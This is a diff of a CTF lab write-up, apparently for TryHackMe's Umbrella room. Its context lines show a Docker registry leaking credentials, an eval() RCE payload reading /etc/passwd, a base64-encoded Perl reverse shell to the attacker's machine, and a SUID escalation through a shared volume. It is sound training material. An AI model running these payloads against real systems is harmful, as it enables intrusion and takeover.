@@ -70,7 +70,7 @@ Just a login page, not any interesting things in source code and directory busti
 
 Can try for sql injection payload also, but that also didn’t worked.
 
-![image.png](image.png)
+<img width="1919" height="674" alt="image" src="https://github.com/user-attachments/assets/f29bd7c3-6d7d-4041-9943-3a4ecf27d3a3" />
 
 Looks like the only way to get inside is valid credentials. But now, it’s a dead end.
 
@@ -123,11 +123,11 @@ Think of it as a **blueprint or metadata** about the image — it doesn’t cont
 └─$ curl http://10.10.251.82:5000/v2/umbrella/timetracking/manifests/latest
 ```
 
-![image.png](image%201.png)
+<img width="1913" height="657" alt="image 1" src="https://github.com/user-attachments/assets/b9849fe6-023c-49b9-a575-04a1146c89b3" />
 
 And here, if we analyse the result carefully, we see database credentials stored in plain text. Maybe we can use them to connect to mysql service running on port 3306.
 
-![image.png](image%202.png)
+<img width="1912" height="622" alt="image 2" src="https://github.com/user-attachments/assets/44376ffe-b7f1-45d9-8ab7-c128b48eb48a" />
 
 The results provided SHA256 digests of each image layer, which I downloaded via the `/blobs/` endpoint.
 
@@ -388,13 +388,13 @@ And it looks like a timetracking application, we can put integers in that input 
 
 If we look back into our app.js file extracted from docker image layers, the `/time` route used `eval()` unsafely on user input:
 
-![image.png](image%203.png)
+<img width="1902" height="422" alt="image 3" src="https://github.com/user-attachments/assets/14038f89-e826-49f3-a6c5-b5265756cad1" />
 
 This allows authenticated users to achieve **Remote Code Execution (RCE)** by submitting crafted input such as:
 
 With `arguments[1].end(require('child_process').execSync('cat /etc/passwd'))`  we are able to retrieve the `/etc/passwd` file. 
 
-![image.png](image%204.png)
+<img width="1919" height="638" alt="image 4" src="https://github.com/user-attachments/assets/9320cfef-d580-43bd-a343-062c7b91ac89" />
 
 And with following payload we can get the reverse shell back to our machine:
 
@@ -409,9 +409,9 @@ require('child_process').execSync('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTcu
 
 Now, just have to setup netcat on listning mode and have to put this payload in input and submit.
 
-![image.png](image%205.png)
+<img width="1918" height="403" alt="image 5" src="https://github.com/user-attachments/assets/ed8bd356-5d66-4af0-aa47-d3a8eeba6ea6" />
 
-![image.png](image%206.png)
+<img width="1770" height="205" alt="image 6" src="https://github.com/user-attachments/assets/56d1c268-3177-4540-8cbd-50a1eda8d730" />
 
 We got directly root shell on docker container.
 
@@ -453,11 +453,11 @@ THM{d832c0e4......REDACTED}
 
 During post-exploitation, I found that the container(root access) had a volume mount to a directory named `/logs`, which was also accessible on the host system(claire-r account’s access).
 
-![image.png](image%207.png)
+<img width="1532" height="726" alt="image 7" src="https://github.com/user-attachments/assets/c636a0cb-5236-4234-aea7-42117320fc19" />
 
-![image.png](image%208.png)
+<img width="1578" height="173" alt="image 8" src="https://github.com/user-attachments/assets/ea2b0850-c689-4b10-9b69-4d4337b62fd7" />
 
-![image.png](image%209.png)
+<img width="1608" height="586" alt="image 9" src="https://github.com/user-attachments/assets/310030fc-1f62-4285-8ef0-3e38b8cabc9b" />
 
 Strategy:
 Use your **root access inside the container** to **place a SUID-root binary** (like a bash shell) inside the **mounted folder**. Since that folder is also visible to the host and owned by root (because the file was created as root inside the container), you can run it from the host to escalate privileges.
@@ -483,7 +483,7 @@ drwxr-xr-x 1 root root    4096 Dec 22  2022 ..
 
 On the host, I executed the binary:
 
-![image.png](image%2010.png)
+<img width="1768" height="257" alt="image 10" src="https://github.com/user-attachments/assets/70932348-2da1-4b4e-b01f-0a85698cd76a" />
 
 And we are now root on the host!
 
